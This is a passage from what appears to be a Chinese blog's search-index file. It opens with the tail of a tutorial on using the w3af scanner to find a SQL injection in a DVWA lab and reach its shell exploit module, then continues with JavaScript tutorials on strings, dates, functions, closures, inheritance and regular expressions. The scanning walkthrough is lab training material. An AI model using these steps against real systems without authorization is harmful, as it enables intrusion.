audit 中选择 sqli 插件，添加 Target 目标地址 [http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit] 然后 Start 开始扫描。 此后，W3af 将会自动的去扫描发现 sql 漏洞: 从Result 中可以知道这是一个关于 MySQL 的注入漏洞，并且是在第 39 次请求中发现的。 更进一步，我们可以在 Result –&gt; Request/Response navigator 实施过滤规则，以查看第39次请求/响应的参数信息，以此得知该漏洞到底是如何发现的。 上图所示的 id 参数部分便是 w3af 对该页面发起的参数，我们可以通过其解码工具得知具体的明文信息。 此外，还可以通过服务器端的响应消息查看端倪: Exploit在扫描成功获得漏洞后，进入 Exploit 漏洞利用模块。 双击 shell ，可以查看该shell 下可以利用的信息:]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS引用类型(1)之String]]></title>
      <url>%2F2016%2F10%2F06%2FJS%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B(5)%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8C%85%E8%A3%85%E7%B1%BB%E5%9E%8B%2F</url>
      <content type="text"><![CDATA[0x00 StringString 对象是对原始 string 类型的封装。 String 对象的常用方法 方法 描述 charAt(),charCodeAt() 返回字符串指定位置的字符或者字符编码 indexOf(),lastIndexOf() 分别返回字符串中指定子串的位置或最后位 startWith(),endsWitch(),includes 返回字符串是否以指定字符串开始、结束或包含指定字符串。 concat() 连接两个字符串并返回新的字符串 split() 通过将字符串分离成一个个子串来把一个String对象分裂到一个字符串数组 slice() 从一个字符串提取片段并作为新字符串返回 substring(),sbustr() 分别通过指定起始和结束位置，起始位置和长度来返回字符串的指定子集 match(),replace(regexp/substr,replacement),search() 正则表达式 toLowerCase(),toUpperCase() 分别返回字符串的小写表示和大写表示 repeat() 将字符串内容重复指定次数后返回 trim()去掉字符串开头和结尾的空白字符 0x01 String objectString 对象的常用方法charAt() 返回指定索引位置的字符串 chaerCodeAt() 返回下标对应的字符编码concat() 连接字符串 indexOf() 返回字符串中检索指定字符第一次出现的位置，不存在返回 -1 lastIndexOf() 不存在返回 -1 返回字符串中检索指定字符串最后一次出现的位置 replace() 替换匹配字符串 slice() 提取字符串片段，[0,N)，起始位和结束位可以是负数克隆数组，以妨破坏原数组的顺序 substring() 提取字符串片段, [0,N)，起始位和结束位不可以是负数 substr() 返回从Start开始指定数量的字符 subsplit() 分隔为数组 toString() 转换为指定进制的字符串 toUpperCase() 把字母转换为大写 toLowerCase() 把字符串转换为小写 0x02 彩票生产小程序12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;body&gt; &lt;button id=&quot;caiBtn&quot; onclick=&quot;showNum()&quot;&gt;&lt;/button&gt; &lt;input type=&quot;text&quot; name=&quot;&quot; id=&quot;show_text&quot;&gt;&lt;/body&gt;&lt;script&gt;var randomArray = new Array(); function generateRandom (x,y,z)&#123; if ( x &lt; y )&#123; var tmp = x; x = y; y = tmp; &#125; for ( var i = 0; i &lt; z; i ++)&#123; var newRandom = Math.floor(Math.random()*(x - y + 1)) + y; var exits = false; for( j =0 ;j &lt; i; j++)&#123; if(randomArray[j] == newRandom)&#123; exits = true; i--; break; &#125; &#125; if(!exits)&#123; randomArray[i] = newRandom; &#125; &#125; return randomArray; &#125; function showNum()&#123; generateRandom(0,31,5); var txt = document.getElementById(&quot;show_text&quot;); txt.value = randomArray; &#125;&lt;/script&gt; 这个小程序，实现了对 Math.random() 函数的应用。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS引用类型(4)之Date]]></title>
      <url>%2F2016%2F10%2F06%2FJS%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B(4)%E4%B9%8BDate%2F</url>
      <content type="text"><![CDATA[DateJS 没有日期数据类型。但是可以在程序里使用 Date 对象和其方法来处理日期和时间。Date对象有大量的设置、获取和操作日期的方法。 它并不含有任何属性。 JS 处理时间是从1970年1月1日00:00:00以来的毫秒数来储存数据类型的。 1var dateObjectName = new Date([parameterss]); 参数可以是以下任意一种: 无参数: 创建今天的日期和时间 参数为一个完整的日期和时间:” moth day, year houer: minute: seconds” 1var thistime = new Date(&quot;December 25, 1990 20:12:34&quot;); 一个年，月，日，时，分，秒的整数集合 1var thistime = new Date(1990,11,23,9,45,0); 如果想根据特定的日期和时间创建日期对象，必须传入该日期的毫秒数(从UTC时间1970.1.1 00:00:00 起到该日期的毫秒数)。当然这太麻烦了，所以 JS 提供了 Date.parse() 和 Date.UTC() 方法来简化这一过程。 Date.parse()使用 Date.parse() 方法解析日期字符串 12var objectDate = new Date(Date.parse(&quot;9/16/1994 20:00:55&quot;));alert(objectDate); 如果直接将日期字符串传入 Date 构造函数，也会在后台调用 Date.parse() 方法。 12var objectDate = new Date(&quot;May 25, 2004&quot;);alert(objectDate); Date.parse() 通常接收如下日期格式: “/月/日/年/“，如 “9/16/1996”; “英文 月名 日,年”,如 “January 12,2008”; “英文 星期几 月名 日 年 时:分:秒 时区”, 如 “Tue May 25 20034 09:00:00 GMT-0700” Date.UTC()Date.UTC() 方法同样也返回日期表示的毫秒数，但是它与Date.parse() 在构建时使用不同的信息。 秒，分： 0~59 时： 0~23 星期：0（周日）~6（周六） 日期： 1~31 月份： 0（一月）~11（十二月） 年份：从1970开始的年数 Date.parse() 接收的是时间字符串形式的参数，而Date.UTC() 接收的是时间数值形式的参数。还有一个不同之处便是，Date.UTC() 的日期和事件都基于本地时区而非 GMT 来创建。 1234var today = new Date(2016, 5, 1, 22, 0, 17);//Wed Jun 01 2016 22:00:17 GMT+0800 (中国标准时间)var today2 = new Date(Date.UTC(2016, 5, 1, 22, 0, 17));//Thu Jun 02 2016 06:00:17 GMT+0800 (中国标准时间) 使用 Date.UTC() 方法创建的时间比 Date 的构造函数多了 8 个小时。 0x01 获取、设置日期方法Date 类型提供了将日期格式化为字符串的方法。 12345678910var today = new Date(2016, 5, 1, 22, 0, 17); console.log(today.getDate(()); // 获得天数 0-31console.log(today.getDay()); // 获得星期 0-6console.log(today.getMonth()); // 获得月份 0-11console.log(today.getFullYear()); // 返回四位数年份console.log(today.getHours()); // 获得时 0-23console.log(today.getMinutes()); // 获得分 0-59console.log(today.getSeconds()); // 获得秒 0-59console.log(today.getMilliseconds()); // 获得毫秒 0-999console.log(today.getTime()); // 获得从1970 到现在的毫秒数 0X02 日期格式化方法以下方法将根据本地时间格式，将 Date 对象表示为时间字符串。 12345console.log(today.toDateString()); // Wed Jun 01 2016console.log(today.toTimeString()); // 22:00:17 GMT+0800 (中国标准时间)console.log(today.toLocaleDateString()); // 2016/6/1console.log(today.toLocaleTimeString()); // 下午 10:00:17console.log(today.toUTCString()); // Wed, 01 Jun 2016 14:00:17 GMT]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS引用类型(3)之Function]]></title>
      <url>%2F2016%2F10%2F06%2FJS%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B(3)%E4%B9%8BFunction%2F</url>
      <content type="text"><![CDATA[0x00 函数定义JS 使用关键字 function 关键字来定义函数(也称为函数的声明): 123funciton [function] &#123; statements;&#125; function 后面紧跟函数名 functionName 如果省去，便是一个匿名函数。 Function Experison可以使用函数的标准语法定义一个函数，也可以使用函数表达式创建一个函数，这个函数可以是匿名函数 1var square = funciton [ functionName] ( arguments) &#123; ... &#125;; 0x01 Calling Funciton在页面加载完成以后调用函数: 1234&lt;body onload = &quot;functionName()&quot;&gt;&lt;/body&gt;//orwindow.onload(functionName()); 函数一定要处于调用它们的域中，但是函数的声明可以在调用之后，但是这种方式只限于 function funcName () {} 的标准方式。而下面的代码是无效的: 1234console.log(square(5)); //square is not definedsquare = funciton (n) &#123; return n*n;&#125; 0x02 About argumentsJS 中的参数在内部是用一个数组来表示的，在函数体内部可以通过 arguments 对象来访问这个数组，从而获取传递给函数的每一个参数。 其实，arguments 并非 Array 的实例，它只是与数组类似而已，但是我们依然可以使用方括号 [ ] 语法来访问它的每一个元素。 arguments 可以与参数名一起使用，并且它的值永远与对应的命名参数的值保持一致。 arguments 对象是函数的一个内部对象，存储的是 传递给该函数的实参 JS 函数有一个重要特点: 命名的参数只提供便利，但不是必需的。 JS 中的所有参数传递都是值传递，不可能通过引用传递参数。 arguments.calleearguments 对象有一个叫 callee 的属性，该属性是一个指针，指向拥有这个 arguments 对象的函数。 1234567function factorial (num)&#123; if (num &lt;= 1 )&#123; return 1; &#125;else &#123; return num * arguments.callee(num - 1); &#125; &#125; arguments.callee 属性减少了函数名与函数内部调用的紧密耦合。这样，无论应用函数时使用的是什么名字，都可以保证正常完成递归调用。 0x03 函数声明与提升函数声明与变量声明会被JavaScript引擎隐式地提升到当前作用域的顶部，但是对变量只提升名称不会提升赋值部分。 12345678910var foo = 1;// 声明了一个全局的 foo 并赋值为 1function fn()&#123; /*所有的声明的变量被提升到顶部*/ console.log(foo); // undefined var foo = 2; // 在函数内部声明了一个 foo 变量并赋值为 2 console.log(foo); // 2&#125;fn() 慎用 name。 上面的 fn 函数其实相当于: 1234567function fn()&#123; var foo; /*所有的声明的变量被提升到顶部*/ console.log(foo); // undefined foo = 2; console.log(foo); // 2&#125; 而在全局作用域的 foo 变量在 fn 函数内部会被屏蔽。 此外，值得一提的是函数声明与函数表达式，浏览器会率先读取函数声明，并使其在执行任何代码之前可用；而对于函数表达式，则必须等到解析器执行到它所在的代码行，才会执行。 123456789101112alert(sum(10,10)// 正常运行，么有问题function sum(a, b)&#123; return a+b&#125;var sum = null;alert(sum(10,10)// 运行期间发生错误，原因在于函位于一个初始化语句中，而不是一个函数声明var sum = function(a,b)&#123; return a + b&#125; 0x04 关于 this 对象this 对象是在运行时基于函数的执行环境绑定的:在全局环境中，this 等于window 对象，当函数被作为某个对象的方法调用时，this 等于那个对象。不过由于匿名函数的执行环境具有全局性，因此 this 通常指向window。但是这并不是绝对。 12345678910111213141516var name = &apos;莱昂纳多.迪卡普里奥&apos;var obj = &#123; name:&apos;小李子&apos;, sayName:function()&#123; alert(this.name) fn = function()&#123; alert(this.name) &#125; return fn; &#125;&#125;var bibao = obj.sayName()// alert:小李子bibao()// alert:莱昂纳多.迪卡普里奥 以下是 this 的 4 种使用场景: this(1) 作为对象方法的调用,指代调用该方法的对象12345678910111213141516function Base(name)&#123; this.name = name; this.say = function ()&#123; console.log(&apos;name:&apos;+this.name) &#125;&#125;Base.prototype.say = function (name)&#123; console.log(this.name) // console.log(name)&#125;let tom = new Base(&apos;tom&apos;) tom.say();// 该例中 this指代 tom 对象。 this(2) 作为普通函数来调用太简单，过。 this(3) 构造器调用123456function MyClass (name)&#123; this.name = name; &#125;var me = new MyClass(&apos;jack&apos;)// this 指代 me 对象 this(4) Function.prototype.call()/apply()如下讲解。 总结: this 指代的是运行时的作用域(即上下文环境) 0x05 apply(),call()apply() 和 call() 都可以用于改变函数执行时的上下文，其实就是改变 this 的指向，其本质上是同一个方法，只是接收参数的形式有所不同而已。 123456789101112131415161718192021function Human (name)&#123; this.name = name;&#125;Human.prototype = &#123; constructor: Human, sayName: function()&#123; alert(this.name) &#125;&#125;var person = new Human(&quot;李小龙&quot;)person.sayName()// 李小龙var cat = &#123; name:&quot;小咪&quot;&#125;person.sayName.call(cat)//person.sayName.apply(cat)// 小咪 如下，cat 首先并不具备 sayName() 方法，但是，我们使用了 call,动态改变了其执行的上下文，拿了 person 的 sayName() 来用。 很好的实现了代码复用。 使用 call() 或 apply() 来扩充作用域的最大好处，即是对象不需要与方法有任何的耦合关系 call 和 apply 的区别call 和 apply 的第一个参数都是要改变上下文的对象，但是其后call 以参数列表的形式接收参数，而 apply 以数组的形式接收参数。 12fn.call(obj,arg1,arg2...);fn.apply(obj, [arg1,arg2,...]); call 和 apply 改变了函数执行中this的上下文以后便立即执行该函数，而 bind 则是返回改变了上下文后的一个函数 0x06 闭包 没有块级作用域在了解闭包以前，我们需要知道 JS 是没有块级作用域的，这意味着在块级语句中定义的变量，实际上是在包含函数而非语句中创建的。 1234for (var i = 0;i &lt; 10; i ++) &#123; console.log(i);&#125;alert(i); // i = 10; 对 JS 而言，有 for 语句创建的变量 i 即使在 for 循环执行结束以后，也依旧会存在于循环外部的执行环境中。 何为闭包？闭包 是指有权访问另一个函数作用域中的变量的函数。创建闭包的常见方式，就是在一个函数内部创建另一个函数。 闭包的常见形式1234567891011121314151617181920212223function f9()&#123; var n = 999; add = function()&#123;n++&#125;; // 定义一个内部函数(匿名函数) function f10()&#123; // 定义一个内部函数 f10 函数 alert(n) &#125; return f10;&#125;var fn = f9();// 立即执行 f9 函数，并将执行结果赋值给 fn 变量// fn -=&gt; f10 此时 fn 变量指向 f10 函数add();// n == 1000fn()// 立即执行 f10 函数// alert:1000add();// n == 10001fn()// 立即执行 f10 函数// alert:1001 使用匿名函数模仿块级作用域JS 重来不会告诉你是否多次声明了同一个变量，遇到这种情况，它只会对后续的声明视而不见(不过，它会执行后续声明中的变量初始化)。 但是，我们是可以使用匿名函数来模仿块级作用域的。 123( function () &#123; // 这里是块级作用域&#125;)(); 上述，定义并立即调用了一个匿名函数。将函数声明包含在一对圆括号中，表示它是一个函数表达式。而紧跟的另一对圆括号会立即调用这个函数。 这种技术经常在全局作用域被用在函数外部，从而限制向全局作用域中添加过多的变量和函数。在一个由很多人开发的大型项目中，过多的全局变量和函数很容易导致命名冲突，而通过创建私有作用域，每个开发人员既可以使用自己的变量，又不必搞乱全局作用域。 123456( function () &#123; var now = new Date(); if (now.getMonth() == 0 &amp;&amp; now.getDate() == 1)&#123; alert(&quot;Happy New Year!&quot;); &#125;&#125;)(); 闭包的缺点：滥用闭包函数会造成内存泄露，因为闭包中引用到的包裹函数中定义的变量都永远不会被释放，所以我们应该在必要的时候，及时释放这个闭包函数。 0x07 私有变量JS 没有私有成员的概念，所有对象属性都是公有的。 不过，倒是有个私有变量的概念。任何在函数中定义的变量，都可以认为是私有变量，因为不能在函数的外部访问这些变量。私有变量包括 函数的参数, 局部变量， 在函数内部定义的其它函数。 不在函数外部访问这个私有的变量和函数，但是可以定义 特权方法( privileged method ) 使其有权访问私有变量和私有函数。 对此，有两种方法在在对象上创建特权方法。一是 在构造函数中创建特权方法 ，但是使用构造函数的缺点也是显而易见的，它会针对每个实例都创建同样一组新方法，这对内存是种极大的浪费。其次我们可以使用 静态私有变量。 静态私有变量通过在私有作用域中定义私有变量和函数，同样也可以创建特权方法。 其基本模式如下: 1234567891011121314151617181920( function () &#123; //私有变量和私有函数 var privateVariable = 10; function privateFunction () &#123; return false; &#125; // 构造函数 MyObject = function () &#123; &#125;; //公有|特权方法 MyObject.prototype.publicMethod = function () &#123; privateVariable ++; return privateFunction(); &#125;&#125;)(); 1234567891011121314151617181920212223&lt;ul&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt;&lt;/ul&gt; &lt;script type=&quot;text/javascript&quot;&gt;var lis = document.querySelectorAll(&quot;ul li&quot;)for(let i=0; i&lt; lis.length;i++)&#123; (function(index)&#123; lis[index].onclick = function()&#123; lis[index].style.borderLeft = &quot;2px solid deeppink&quot; for(let j = 0; j &lt; lis.length;j++)&#123; if(j!=index)&#123; lis[j].style.border = &quot;none&quot; &#125; &#125; &#125; &#125;)(i)&#125;&lt;/script&gt; 如上，我们创建了一个私有作用域，并在其中封装了一个构造函数及其相应的方法。在私有作用域中，首先定义了私有变量和私有函数，然后又定义了构造函数和公有方法。而共有方法是在构造函数的原型上定义的。 但是，在这个模式中定义构造函数时并没有使用函数声明，而是使用了函数表达式，因为函数声明只能创建局部函数。出于同样的原因，我们也没有在声明 MyObject 时使用 var 关键字，**初始化未经声明的变量，总是会创建一个全局变量，因此，MyObject 就成了一个全局变量。 0x07 几个全局函数eval()eval() 是一个很强大的方法，它像一个完整的 ECMAScript 解析器，能够解释代码字符串。 1234// evalvar str =&quot;19-2&quot;console.log(eval(str))// 17 isFinite()isNaN()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS对象(1)重新认识面向对象]]></title>
      <url>%2F2016%2F10%2F05%2FJS%E5%AF%B9%E8%B1%A1(1)%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%2F</url>
      <content type="text"><![CDATA[0x00 面向对象从设计模式上看，对象是计算机抽象现实世界的一种方式。 面向对象编程(object-oriented programming)的最主要目的是提高程序的重复使用性。 我们说，对象具有属性(property)和方法(function)，（其实本质上方法也是一种属性）在面向对象的设计模式中，属性是一种描述，描述对象的状态，比如一个人一天 24 小时的情绪，每个时刻他的情绪都具有不同的状态，喜怒哀乐，抑郁癫狂，贪嗔痴念，当然情绪只是生而为人的众多状态中的一种而已。而对象中的方法是一种功能，它的功能就是操作对象的属性。比如，吃饭可以改变一个人的状态，对吃货而已，吃饱以后会觉得特别幸福，吃饭是一种功能，它改变了一个人的情绪，让人觉得幸福。 那么，反过来细想，人是一个对象，它具有情绪，他还要吃饭。所以可以说，对象是对属性和方法的一种封装。 0x01 南拳北腿对象中的几个概念： 一切事物皆对象 对象具有封装和继承特性 对象与对象之间使用消息通信，各自存在消息隐藏 然而，面向对象仅仅是一个概念或者编程思想而已，它不应该依赖于某个语言存在。比如 Java 采用面向对象思想构造其语言，它实现了类、继承、派生、多态、接口等机制。但是这些机制，只是实现面向对象编程的一种手段，而非必须。换言之，一门语言可以根据其自身特性选择合适的方式来实现面向对象。 JavaScript 语言是通过一种叫做原型（prototype） 的方式来实现面向对象编程的。 所以无论是基于类的（class-based）面向对象，还是 基于原型的 (prototype-based) 面向对象 也都只是为实现面向对象这一理念在构造客观世界的两种不同方式而已。 0x02 类 or 原型在基于类的面向对象方式中，对象（object） 依靠 类（class） 来产生。而在基于原型的面向对象方式中，对象（object） 则是依靠 构造器（constructor） 利用 原型（prototype） 构造出来的。 而关于这两种方式谁更为彻底地表达了面向对象的思想，目前尚有争论。 类是一个抽象概念而并非实体，而对象的产生是一个实体的产生；原型方式中的构造器 (constructor) 和原型 (prototype) 本身是其他对象通过原型方式构造出来的对象。 在类式面向对象语言中，对象的状态 (state) 由对象实例 (instance) 所持有，对象的行为方法 (method) 则由声明该对象的类所持有，并且只有对象的结构和方法能够被继承；而在原型式面向对象语言中，对象的行为、状态都属于对象本身，并且能够一起被继承。 JavaScript 是一种基于原型的编程语言，并没有 class 语句，而是把函数用作类。当然，ES6 提供了 class 的语法糖 0x03 JavaScript 中的面向对象ECMAScript 是一门彻底的面向对象的编程语言，JavaScript 是其中的一个变种 (variant)。它提供了 6 种基本数据类型，即 Boolean、Number、String、Null、Undefined、Object。为了实现面向对象，ECMAScript设计出了一种非常成功的数据结构 - JSON(JavaScript Object Notation), 这一经典结构已经可以脱离语言而成为一种广泛应用的数据交互格式。 ECMAScript除了字面式声明（literal notation） 方式之外， 允许通过构造器（constructor） 创建对象。每个构造器实际上是一个函数（function） 对象, 该函数对象含有一个prototype属性用于实现基于原型的继承（prototype-based inheritance） 和共享属性（shared properties）。对象可以由 “new 关键字 + 构造器调用” 方式来创建。 但需要指出的是，这与java语言的new含义毫无关系，因为其对象构造的机理完全不同。ECMAScript 完全可以用其它非new表达式来用调用构造器创建对象。 0x04 原型链涉及到继承这一块，Javascript 只有一种结构，那就是：对象。在 javaScript 中，每个对象都有一个指向它的原型对象（prototype）的内部属性_proto_属性。而这个原型对象又有自己的原型，直到某个对象的原型为 null 为止（也就是不再有原型指向），组成这条链的最后一环。这种一级一级的链结构就称为原型链（prototype chain）。 一张经典的 JavaScript 原型链图可以揭示一切: 要理解上图，只需要搞明白两个属性（指针）的区别,即是_proto_ 属性和 prototype 属性。 每个构造函数都有一个 prototype 属性，该属性是一个指针，指向该构造函数的原型。 而实例中包含一个属性 _proto_ 属性，该属性是一个指针，指向该实例所属的构造函数创建的原型。 不同的浏览器对实例中的 _proto_ 属性表示不同。 每创建一个构造函数便会相应的创建一个与其相对应的原型对象(由构造函数创建出来的原型对象，JS 引擎自动创建)。 在默认情况下，构造函数创建的原型对象都会有一个 constructor 属性，而这个属性指向 prototype 属性所在的那个函数。 所以，我们可以得出一个结论，构造函数的 prototype 和由该构造函数创建的实例的 _proto_ 指向的是内存中的的同一块地址，也正是如此，才使得在原型中定义的方法和属性具有共享的基础。 有了 原型链，便可以定义一种所谓的 属性隐藏机制，并通过这种机制实现继承。ECMAScript 规定，当要给某个对象的属性赋值时，解释器会查找该对象原型链中第一个含有该属性的对象（注：原型本身就是一个对象，那么原型链即为一组对象的链。对象的原型链中的第一个对象是该对象本身）进行赋值。 所以，当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依此层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。 0x06 JavaScript 私有成员实现JavaScript 没有实现面向对象中的信息隐藏，即私有和公有。与其他类式面向对象那样显式地声明私有公有成员的方式不同，JavaScript 的信息隐藏就是靠闭包实现的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS对象(2)值传递与引用传递]]></title>
      <url>%2F2016%2F10%2F05%2FJS%E5%AF%B9%E8%B1%A1(2)%E5%80%BC%E4%BC%A0%E9%80%92%E4%B8%8E%E5%BC%95%E7%94%A8%E4%BC%A0%E9%80%92%2F</url>
      <content type="text"><![CDATA[0x00 数据类型与数据结构我们需要先回忆一下。 JavaScript 是一种弱类型或者说动态语言。这意味着你不用提前声明变量的类型，在程序运行过程中，类型会被自动确定。 此外，最新的 ECMAScript 标准定义了7中数据类型: 6种 原始类型: Boolean, Null, Undefined, Number, Stirng, Symbol 一种复杂类型(引用类型)对象: Object. JavaScript 一切皆对象(除了6中原始类型) 在 JS 中，所有除 Object 以为的类型都是不可变的。比如，JS 中字符串是不可变的，任何对字符串的操作一定返回了一个新字符串，原始字符串并没有被改变。 0x02 值传递与引用传递通过上述的理解要明白 Javascript 中值传递与引用传递就太简单了，下面的两个超级简单的 demo 可以诠释一切。 123456789// 值传递var a = 2;function foo(b)&#123; b +=10; &#125;foo(a)console.log(a) // 2// 原始 a 的值没有发生改变 值传递: 只将值进行传递，与原变量无关，值会被复制一份，保存在内存中另一个不同的位置。 当我们修改传递后的值时，修改的是内存中新的位置，而原变量不会被影响，还是原来的值。 这种情况往往出现在6中原始类型中。 123456789//引用传递var a = [2];function foo(b)&#123; b.push(10) &#125;foo(a)console.log(a) // [2, 10]// 原始 a 的值被改变了 引用传递: 将内存地址进行传递，相当于把原变量完整的传递过来。 当我们修改传递后的值时，修改的是内存中原来的位置，会对原变量造成影响。 这种情况往往出现在对象上。 利用引用传递的特性，我们有了实现面向对象的基础]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS对象番外篇(2)继承的多种方式]]></title>
      <url>%2F2016%2F10%2F05%2FJS%E5%AF%B9%E8%B1%A1%E7%95%AA%E5%A4%96%E7%AF%87(2)%E7%BB%A7%E6%89%BF%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E5%BC%8F%2F</url>
      <content type="text"><![CDATA[0x01 基本继承模式123456789101112131415161718192021function SuperType()&#123; this.property = true; &#125; SuperType.prototype.getSuperValue = function ()&#123; return this.property; &#125;; function SubType()&#123; this.subproperty = false; &#125; SubType.prototype = new SuperType(); SubType.prototype.getSubVaule = function()&#123; return this.subproperty; &#125; var instance = new SubType(); console.log(instance.getSubVaule()); //false console.log(instance.getSuperValue()); //true 如上，我们通过将 超类的实例赋值给子类的原型实现了从超类到子类的继承。 然后，又通过将子类的实例赋值给 instance的原型 实现了从子类到 instance 的继承。 需要知道的是，此时 instance 的 constructor 指向的是 SuperType；因为子类的原型指向的是超类的原型对象，而这个原型的 constructor 属性指向的是 超类。 同样，在我们使用原型继承的时不能使用对象字面量创建原型方法，这样会重写原型。 当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依此层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。 0x01 Combination Inheritance组合继承(Combination Inheritance) 有叫伪经典继承，其结合了原型链和构造函数两者之长。其思想是使用原型链实现对原型属性和方法的继承，而通过构造函数实现对实例属性继承。 如此，既通过在原型上定义方法实现了函数复用，又能够保证每个实例都有自己的属性。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;script type=&quot;text/javascript&quot;&gt; function SuperType (name)&#123; this.name = name; this.colors = [&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;]; &#125; SuperType.prototype.sayName = function ()&#123; console.log(this.name); &#125; function SubType (name, age)&#123; //继承属性 SuperType.call(this, name); //定义 SubType 自己的属性 this.age = age; &#125; //继承方法 SubType.prototype = new SuperType(); //定义 SubType 自己的方法 SubType.prototype.sayAge = function ()&#123; console.log(this.age); &#125; //创建 instance1 实例，并继承自 SubType var instance1 = new SubType(&quot;Jack&quot;, 89); instance1.colors.push(&quot;black&quot;); console.log(instance1.colors); //red,green,blue,black instance1.sayName(); //jack instance1.sayAge(); //89 var instance2 = new SubType(&quot;Marge&quot;, 23); console.log(instance2.colors); //red,green,blue instance2.sayName(); //Marge instance2.sayAge(); //23&lt;/script&gt;&lt;/html&gt; 组合继承模式避免了原型链和借用构造函数的缺陷，融合了它们的优点，称为 JS 中最常用的继承模式。 0x02 寄生组合继承所谓寄生组合继承，即通过借用构造函数来继承属性，通过原型链的混成形式来继承方法。其背后的基本思想是：不必为了指定子类型的原型而调用超类型的构造函数，我们所需要的无非就是超类型原型的一副本而已。本质上就是使用寄生继承来继承超类型的原型，然后再将结果指定给子类型的原型。 继承组合继承是引用类型最理想的继承方式。 12345function inheritPrototype (subType, superType)&#123; var prototype = object(superType.prototype); //创建对象 prototype.constructor = subType; //增强对象 subType.prototype = prototype; // 指定对象 &#125; 如上，inheritPrototype() 函数实现了继承组合继承最简单的形式。 这个函数接收两个参数: 子类型构造函数和超类型构造函数。首先在函数内部创建超类型原型的一个副本。然后为创建的副本添加 constructor 属性，从而弥补因重写原型而失去的默认的 consructor 属性。最后将新创建的对象赋值给子类型的原型。 12345678910111213141516171819202122232425262728293031 function inheritPrototype (SubType, SuperType)&#123; var prototype = Object(SuperType.prototype); //创建对象 prototype.constructor = SubType; //增强对象 SubType.prototype = prototype; // 指定对象 &#125; function SuperType(name)&#123; this.name = name; this.colors = [&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;]; &#125;SuperType.prototype.sayName = function ()&#123; console.log(this.name);&#125;function SubType(name, age)&#123; SuperType.call(this, name); this.age = age;&#125;inheritPrototype(SubType, SuperType);SubType.prototype.sayAge = function ()&#123; console.log(this.age);&#125;var instance = new SubType(&quot;jack&quot;);instance.sayName();]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS正则(1)正则初步]]></title>
      <url>%2F2016%2F09%2F29%2FJS%E6%AD%A3%E5%88%99(1)%E6%AD%A3%E5%88%99%E5%88%9D%E6%AD%A5%2F</url>
      <content type="text"><![CDATA[0x00 RegExp 类型JS 通过 RegExp 类型来支持正则表达式，通过下面的语法便可以创建一正则表达式: 1var experssion = / pattern / flags; pattern 部分可以是任何简单或者复杂的正则表达式。 每个正则表达式带有一个或者多个标志 flags 以表明正则表达式的行为。 正则表达式的匹配模式支持一下三个标志: g : 全局 (global) 模式。 i : 表示不区分大小写 (case-insensitive) 模式。 m : 多行 (multiline) 模式。 0x01 构建正则表达式与其它语言中的正则表达式类似，模式中的所有 元字符 都必需进行转义处理。 1234567891011/** 匹配第一个 &quot;bat&quot; 或者 &quot;cat&quot; ,不区分大小写*/var pattern1 = /[bc]at/i;/** 匹配第一个 &quot;[bc]at&quot;,不区分大小写*/var pattern2 = /\[bc\]at/i; 正则表达中的元字符包括： ( [ { \ ^ $ | ) ? * + . ] } 以上例子都是通过 字面量形式创建正则表达式, 我们还可以通过 RegExp 构造函数创建正则表达式。 12345//字面量形式构建正则表达式var pattern1 = /[bc]at/i;// RegExp 构造函数构建正则表达式vat pattern2 = new RegExp(&quot;[bc]at&quot;, &quot;i&quot;); 值得注意的是，RegExp 构造函数接受的两个参数都是字符串(不能把正则表达式字面量传递给 RegExp构造函数)。当然也正因如此，所有存在于 RxgExp 构造函数中的 元字符 都必需进行双重转义，即使已经转义过的也是如此。 下面是使用 RegExp 构造函数定义形同模式时使用的字符串。 字面量 等价字符串 /\[bc\]at/ “\\[bc\\]at” /.at/ “\\.at” /\w\\hello\\123/ “\\w\\\\hello\\\\123” 使用正则表达式字面量和使用 RegExp 构造函数创建的正则表达式不一样，正则表达字面量始终会共享同一个 RegExp 实例，而使用构造函数的每一个新 RegExp 实例都是一个新实例。?????字面量使用正则的方式是最常用的 0x02 RegExp 实例方法exec()exec() 方法专门为捕获组而设计。exec() 接收一个要匹配的字符串作为参数，然后返回包含第一个匹配项信息的数组，虽然是是 Array 实例但是它包含有两额外的属性: index 和 input。index 表示匹配项在字符串中的位置， input 表示应用正则表达的字符串。 然后，在返回的 Array 数组实例中，第一项是与整个模式匹配的字符串，其他项是与模式中的捕获组匹配的字符串。 123456789var text = &quot;mom and dad and babay&quot;;var pattern = /mom( and dad( and babay)?)?/gi;var matches = pattern.exec(text);console.log(matches.index); //0console.log(matches.input); //整个字符串console.log(matches[0]); //整个字符串console.log(matches[1]); //and dad and babyconsole.log(matches[2]); // and baby test()test() 方法接收一个字符串作为参数，在模式与该参数匹配的情况下返回 true；否则返回 false。 test() 方法通常和 if 语句结合用于验证用户输入。 123456var text = &quot;000-00-0000&quot;;var pattern = 